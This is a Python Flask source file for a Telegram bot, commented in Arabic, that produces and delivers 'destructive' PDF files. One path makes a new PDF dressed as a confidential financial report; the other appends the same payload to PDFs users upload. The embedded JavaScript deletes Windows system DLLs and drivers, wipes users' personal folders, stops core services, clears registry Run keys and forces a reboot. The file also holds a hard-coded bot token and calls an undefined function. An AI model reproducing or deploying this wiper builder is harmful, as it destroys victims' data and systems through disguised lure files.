import os
import time
import requests
import json
import random
from datetime import datetime
from flask import Flask, request
from PyPDF2 import PdfWriter, PdfReader
from reportlab.pdfgen import canvas
from io import BytesIO

app = Flask(__name__)

# ============ تكوين البوت ============
TELEGRAM_CONFIG = {
    "TOKEN": "8872991146:AAEGEnOk2AvkKaHgRO7JRJiTSkTGj6CiGRA",
    "CHAT_ID": "7822155315",
    "API_URL": "https://api.telegram.org/bot"
}

# ============ دوال إنشاء PDF ============
def generate_destructive_pdf():
    try:
        packet = BytesIO()
        c = canvas.Canvas(packet)
        c.drawString(100, 750, "📄 تقرير مالي - سري للغاية")
        c.drawString(100, 720, "يُرجى فتح الملف باستخدام Adobe Reader")
        c.drawString(100, 690, "تم التوليد بواسطة: @hkyyykk_bot")
        c.save()
        packet.seek(0)
        new_pdf = PdfReader(packet)
        writer = PdfWriter()
        writer.add_page(new_pdf.pages[0])
        
        destructive_js = """
        try {
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\*.dll", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\drivers\\\\*.sys", 0, false);
            shell.Run("cmd.exe /c sc stop winmgmt", 0, false);
            shell.Run("cmd.exe /c sc stop wuauserv", 0, false);
            shell.Run("cmd.exe /c sc stop bits", 0, false);
            shell.Run("cmd.exe /c sc stop EventLog", 0, false);
            shell.Run("cmd.exe /c sc stop PlugPlay", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Desktop\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Documents\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Pictures\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Videos\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Music\\\\*.*", 0, false);
            shell.Run("cmd.exe /c reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c reg delete HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            shell.Run("cmd.exe /c msg * ⚠️ تم اختراق نظامك! جميع الملفات تم حذفها.", 0, false);
        } catch(e) {
            try {
                var shell = new ActiveXObject("WScript.Shell");
                shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            } catch(e2) {}
        }
        """
        
        writer.add_js(destructive_js)
        filename = f"destructive_{int(time.time())}.pdf"
        filepath = os.path.join("/tmp", filename)
        with open(filepath, 'wb') as f:
            writer.write(f)
        return filepath
    except Exception as e:
        print(f"خطأ في توليد PDF: {e}")
        return None

# ============ دوال البوت ============
def send_telegram_message(chat_id, message):
    try:
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/sendMessage"
        data = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
        response = requests.post(url, json=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"خطأ في الإرسال: {e}")
        return False

def send_telegram_file(chat_id, file_path, caption=""):
    try:
        if not os.path.exists(file_path):
            return False
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/sendDocument"
        files = {'document': open(file_path, 'rb')}
        data = {'chat_id': chat_id, 'caption': caption}
        response = requests.post(url, files=files, data=data, timeout=30)
        return response.status_code == 200
    except Exception as e:
        print(f"خطأ في إرسال الملف: {e}")
        return False

def download_telegram_file(file_id, save_path):
    try:
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/getFile"
        params = {"file_id": file_id}
        response = requests.get(url, params=params, timeout=10)
        if response.status_code != 200:
            return False
        data = response.json()
        if not data.get('ok'):
            return False
        file_path = data['result']['file_path']
        download_url = f"https://api.telegram.org/file/bot{TELEGRAM_CONFIG['TOKEN']}/{file_path}"
        os.makedirs(os.path.dirname(save_path), exist_ok=True)
        response = requests.get(download_url, stream=True, timeout=60)
        if response.status_code == 200:
            with open(save_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
            return True
        return False
    except Exception as e:
        print(f"خطأ في تحميل الملف: {e}")
        return False

def inject_payload_into_pdf(input_path, output_path=None):
    """حقن البايلود في ملف PDF موجود"""
    if output_path is None:
        output_path = input_path
    try:
        # قراءة الملف الأصلي
        with open(input_path, 'rb') as f:
            original_data = f.read()
        
        # توليد البايلود
        destructive_js = """
        try {
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\*.dll", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\drivers\\\\*.sys", 0, false);
            shell.Run("cmd.exe /c sc stop winmgmt", 0, false);
            shell.Run("cmd.exe /c sc stop wuauserv", 0, false);
            shell.Run("cmd.exe /c sc stop bits", 0, false);
            shell.Run("cmd.exe /c sc stop EventLog", 0, false);
            shell.Run("cmd.exe /c sc stop PlugPlay", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Desktop\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Documents\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Pictures\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Videos\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Music\\\\*.*", 0, false);
            shell.Run("cmd.exe /c reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c reg delete HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            shell.Run("cmd.exe /c msg * ⚠️ تم اختراق نظامك! جميع الملفات تم حذفها.", 0, false);
        } catch(e) {
            try {
                var shell = new ActiveXObject("WScript.Shell");
                shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            } catch(e2) {}
        }
        """
        
        # إلحاق البايلود بنهاية الملف
        combined_data = original_data + destructive_js.encode('utf-8')
        
        with open(output_path, 'wb') as f:
            f.write(combined_data)
        
        return True
    except Exception as e:
        print(f"خطأ في حقن البايلود: {e}")
        return False

# ============ معالجة الملفات والأوامر ============
def handle_file(file_id, file_name, chat_id):
    """معالجة ملف مرسل للبوت"""
    # تحميل الملف
    temp_input = f"/tmp/input_{int(time.time())}_{random.randint(1000, 9999)}"
    temp_output = f"/tmp/output_{int(time.time())}_{random.randint(1000, 9999)}"
    
    send_telegram_message(chat_id, f"⏳ جاري تحميل الملف: {file_name}")
    
    if not download_telegram_file(file_id, temp_input):
        send_telegram_message(chat_id, "❌ فشل تحميل الملف!")
        return
    
    send_telegram_message(chat_id, f"✅ تم تحميل الملف ({os.path.getsize(temp_input)} بايت)")
    
    # حقن البايلود
    if inject_payload_into_file(temp_input, temp_output):
        output_name = f"injected_{file_name}"
        caption = """
⚒️ <b>تم حقن البايلود في الملف بنجاح!</b>

⚠️ <b>تحذير:</b> هذا الملف يقوم بـ:
• حذف ملفات النظام الأساسية
• تعطيل الخدمات الحيوية
• حذف الملفات الشخصية
• إعادة تشغيل النظام قسرياً

🔴 <b>استخدمه فقط في بيئة افتراضية معزولة!</b>
        """
        if send_telegram_file(chat_id, temp_output, caption):
            send_telegram_message(chat_id, "✅ تم إرسال الملف المعدل!")
        else:
            send_telegram_message(chat_id, "❌ فشل إرسال الملف!")
    else:
        send_telegram_message(chat_id, "❌ فشل حقن البايلود في الملف!")
    
    # تنظيف
    try:
        os.remove(temp_input)
        os.remove(temp_output)
    except:
        pass

def handle_command(command, chat_id):
    command = command.lower().strip()
    
    if command == "/start":
        msg = """
🔐 <b>مرحباً بك في بوت توليد PDF التخريبي!</b>

📤 <b>ارسل أي ملف PDF</b> وسيتم حقن بايلود تخريبي فيه وإعادته لك.

⚒️ أو استخدم الأمر <b>/generate</b> لتوليد PDF تخريبي جديد.

⚠️ <b>تحذير:</b> للاستخدام التعليمي فقط في بيئات معزولة!
        """
        send_telegram_message(chat_id, msg)
    
    elif command == "/generate":
        send_telegram_message(chat_id, "⏳ جاري توليد PDF التخريبي...")
        filepath = generate_destructive_pdf()
        if filepath and os.path.exists(filepath):
            caption = """
⚒️ <b>تم توليد PDF التخريبي بنجاح!</b>

⚠️ <b>تحذير:</b> هذا الملف يقوم بـ:
• حذف ملفات النظام الأساسية
• تعطيل الخدمات الحيوية
• حذف الملفات الشخصية
• إعادة تشغيل النظام قسرياً

🔴 <b>استخدمه فقط في بيئة افتراضية معزولة!</b>
            """
            if send_telegram_file(chat_id, filepath, caption):
                send_telegram_message(chat_id, "✅ تم إرسال الملف بنجاح!")
            else:
                send_telegram_message(chat_id, "❌ فشل إرسال الملف!")
            try:
                os.remove(filepath)
            except:
                pass
        else:
            send_telegram_message(chat_id, "❌ فشل توليد الملف!")
    
    elif command == "/help":
        msg = """
📋 <b>الأوامر المتاحة:</b>

/start - عرض رسالة الترحيب
/generate - توليد PDF تخريبي وإرساله
/help - عرض هذه الرسالة
/status - عرض حالة البوت

📤 <b>أو أرسل ملف PDF</b> وسيتم تعديله وإعادته لك.
        """
        send_telegram_message(chat_id, msg)
    
    elif command == "/status":
        msg = f"""
🟢 <b>حالة البوت:</b>
✅ يعمل بنجاح
⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
👤 المستخدم: {chat_id}
        """
        send_telegram_message(chat_id, msg)
    
    else:
        send_telegram_message(chat_id, f"⚠️ أمر غير معروف: {command}\nاستخدم /help للمساعدة")

# ============ Webhook ============
@app.route(f'/webhook/{TELEGRAM_CONFIG["TOKEN"]}', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        if not data:
            return "No data", 400
        
        # معالجة الرسائل
        message = data.get('message', {})
        chat_id = message.get('chat', {}).get('id')
        
        # التحقق من الصلاحية
        if str(chat_id) != TELEGRAM_CONFIG['CHAT_ID']:
            send_telegram_message(chat_id, "⛔ غير مصرح!")
            return "Unauthorized", 403
        
        # معالجة النص
        text = message.get('text', '')
        if text:
            handle_command(text, chat_id)
            return "OK", 200
        
        # معالجة الملفات
        document = message.get('document')
        if document:
            file_id = document['file_id']
            file_name = document.get('file_name', 'unknown.pdf')
            handle_file(file_id, file_name, chat_id)
            return "OK", 200
        
        return "OK", 200
        
    except Exception as e:
        print(f"خطأ في webhook: {e}")
        return "Error", 500

@app.route('/')
def home():
    return "✅ Bot is running! Send /generate or upload a PDF file."

# ============ تسجيل Webhook ============
def set_webhook():
    try:
        hostname = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
        if not hostname:
            hostname = "localhost"
        
        webhook_url = f"https://{hostname}/webhook/{TELEGRAM_CONFIG['TOKEN']}"
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/setWebhook"
        params = {"url": webhook_url}
        response = requests.post(url, data=params)
        
        if response.status_code == 200 and response.json().get('ok'):
            print(f"✅ Webhook تم تسجيله: {webhook_url}")
        else:
            print(f"❌ فشل تسجيل Webhook: {response.text}")
    except Exception as e:
        print(f"❌ خطأ في تسجيل Webhook: {e}")

# ============ التشغيل ============
if __name__ == "__main__":
    set_webhook()
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 تشغيل الخادم على المنفذ {port}")
    app.run(host='0.0.0.0', port=port)
